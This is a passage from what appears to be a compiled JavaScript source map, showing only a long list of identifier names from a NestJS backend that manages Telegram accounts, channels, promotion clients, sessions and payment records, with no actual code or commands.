"entries","key","upload_large","folder","printResources","forEach","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps","toJSON","virtuals","transform","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","Object","Body","ApiTags","ConfigurationService","connection","onModuleInit","clientId","ppplbot","encodeURIComponent","onModuleDestroy","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","Inject","getConnectionToken","Connection","configurationModel","setEnv","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","connectToTelegram","mobile","createClient","connectClient","disconnect","deleteClient","disconnectAll","getMessages","username","limit","getMessagesNew","chatId","offset","getChatId","sendInlineMessage","lastActiveTime","getLastActiveTime","joinChannels","channels","removeOtherAuths","getSelfMsgsInfo","createGroup","forwardSecrets","fromId","joinChannelAndForward","channel","leaveChannel","getCallLog","getMe","getMedia","getmedia","getChannelInfo","sendIds","leaveChannels","getAuths","set2Fa","setProfilePic","updatePrivacy","updateUsername","getGrpMembers","addContact","addContactDto","addContacts","addContactsDto","phoneNumbers","newSession","createNewSession","updateName","firstName","about","updateNameandBio","getMediaMetadata","downloadMediaFile","messageId","downloadProfilePic","index","send","download","unlink","forrward","forwardMessage","deleteChat","deleteProfilePics","deleteProfilePhotos","ApiParam","description","required","Param","ApiQuery","Query","String","AddContactDto","ApiResponse","example","success","addedContacts","AddContactsDto","Res","TelegramService","forwardRef","usersService","bufferClientService","activeChannelsService","channelsService","getActiveClientSetup","setActiveClientSetup","getClient","number","client","clientsMap","connected","hasClient","has","cli","delete","phoneNumber","clear","clearJoinChannelInterval","autoDisconnect","handler","BadRequestException","telegramManager","session","setTimeout","setInterval","errorDetails","contains","toLowerCase","updateByFilter","$or","tgId","expired","telegramClient","getchatId","tryJoiningChannel","chatEntity","joinChannel","canSendMsgs","remove","channelId","removeChannels","errorMessage","includes","channelDetails","searchError","private","entity","getSelfMSgsInfo","fromChatId","createGroupAndForward","getMediaMessages","getDialogs","archived","channelInfo","set2fa","HttpException","parseInt","updatePrivacyforDeletedAccount","updateProfilePic","leaveChannelIds","canSendFalseChats","updateProfile","UsersService","ActiveChannelsService","ChannelsService","BufferClientService","TelegramManager","sessionString","StringSession","channelArray","activeClientSetup","groupDescription","invoke","Api","CreateChannel","title","megagroup","forImport","id","accessHash","chats","folders","EditPeerFolders","folderPeers","InputFolderPeer","peer","InputPeerChannel","folderId","InviteToChannel","InputChannel","users","forwardSecretMsgs","toChatId","totalMessages","forwardedCount","messages","offsetId","total","messageIds","media","filter","undefined","forwardMessages","fromPeer","i","slice","_destroyed","getInputEntity","errorHandler","handlerFn","TelegramClient","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","_errorHandler","me","phone","addEventHandler","event","NewMessage","handleEvents","chat","getEntity","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","bigInt","ChannelParticipants","userInfo","ChannelParticipant","userId","userDetails","lastName","JSON","stringify","entityLike","params","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","photo","fwdFrom","video","canSendTrueCount","canSendFalseCount","totalCount","isChannel","isGroup","broadcast","defaultBannedRights","sendMessages","replace","chatsArrayLength","ids","namePrefix","contacts","AddContact","e","mobiles","inputContacts","InputPhoneContact","ImportContacts","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","ResetAuthorization","getAllChats","chatData","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","MessageMediaPhoto","sizes","downloadMedia","thumb","MessageMediaDocument","document","mimeType","startsWith","thumbs","button","sendMessage","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","maxId","minId","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","count","filteredChatCallCounts","details","isPrivate","Date","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","toISOString","getContacts","GetContacts","DeleteHistory","justClear","revoke","blockUser","Block","downloadWithTimeout","promise","timeout","race","_","query","mediaMessages","endOfMessages","thumbBuffer","mediaType","downloadError","warn","retryAfter","match","MessageMediaEmpty","contentType","fileLocation","inputLocation","InputDocumentFileLocation","setHeader","chunkSize","iterDownload","requestSize","write","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","getFileUrl","writer","createWriteStream","pipe","image","uploadFile","CustomFile","statSync","size","workers","UploadProfilePhoto","hasPassword","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","clearInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","code","onEmailCodeError","sendPhotoChat","caption","sendFile","sendFileChat","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","now","trim","ApiProperty","TgSignupController","clients","restAcc","sendCode","randomIndex","floor","random","creds","apiHash","apiId","TgSignupService","destroy","deleteMessages","forceSMS","sendResult","SendCode","settings","CodeSettings","SentCodeSuccess","phoneCodeHash","SentCodeTypeSms","isCodeViaApp","SentCodeTypeApp","resendResult","ResendCode","sendCodeError","login","passowrd","termsOfService","isRegistrationRequired","SignIn","AuthorizationSignUpRequired","processLogin","passwordSrpResult","passwordSrpCheck","computeCheck","CheckPassword","SignUp","help","AcceptTermsOfService","getCallLogs","zero","callInfo","callId","value","duration","timestamp","sess","payload3","gender","userName","personalChats","calls","totalChats","lastActive","tgcms","post","headers","verifyCode","mesaage","ActiveChannelsController","create","createActiveChannelDto","createMultiple","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","Boolean","Number","UpdateActiveChannelDto","Delete","AddReactionDto","ActiveChannel","ActiveChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","keys","bulkOps","dto","updateOne","bulkWrite","ordered","find","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","reaction","getActiveChannels","skip","notIds","participantsCount","$gt","$ne","restricted","forbidden","sort","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","InternalServerErrorException","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","default","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","body","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","Put","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","deletedCount","removeFromBufferMap","clearBufferMap","skipExisting","existingkeys","$nin","joinChannelQueue","joinChannelIntervalId","shift","availableDate","ConflictException","clientMobiles","flatMap","promoteMobile","bufferclients","promoteclients","promoteclientIds","sixMonthsAgo","documents","twoFA","pop","PromoteClientService","IsString","IsNumber","ApiPropertyOptional","IsOptional","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","keywords","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","HttpStatus","BAD_REQUEST","updateClient","findAllMasked","INTERNAL_SERVER_ERROR","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","archivedClientService","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","values","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","setup","days","archiveOld","formalities","updatedUsername","toUpperCase","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","dbcoll","updateClients","generateNewSession","attempt","Transform","Matches","IsUrl","v","IsArray","ArrayNotEmpty","each","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","logger","Logger","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","debug","method","maxBodyLength","Infinity","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","token","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","parsedError","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","CreateStatDto","StatController","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","StatService","StatSchema","Stat","statModel","stat","Stat2Controller","Stat2Service","Stat2","CreateTransactionDto","UpdateTransactionDto","Transaction","Document","TransactionSchema","TransactionController","transactionService","createTransactionDto","updateTransactionDto","TransactionService","transactionModel","newTransaction","transaction","findById","transactionId","$options","issue","transactions","countDocuments","updatedTransaction","findByIdAndUpdate","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","then","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","IsBoolean","UpdateUserDto","User","UserSchema","UsersController","createUserDto","queryParams","updateUserDto","userModel","clientsService","matchedCount","modifiedCount","use","next","originalUrl","ip","some","endpoint","statusCode","verbose","ms","str","arr","element","options","maxRetries","fetchWithProtocol","version","source","CancelToken","cancel","cancelToken","family","clearTimeout","isCancel","retryCount","responseIPv4","responseIPv6","inputString","matches","botToken","botCount","json1","json2","keysToIgnore","deepCompare","obj1","obj2","keys1","keys2","obj","extractMessage","isArray","item","resultString","errors","module","require","__webpack_module_cache__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","call","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","ValidationPipe","reason","isShuttingDown","shutdown","signal","exit","init","listen","bootstrap"],"sourceRoot":""}
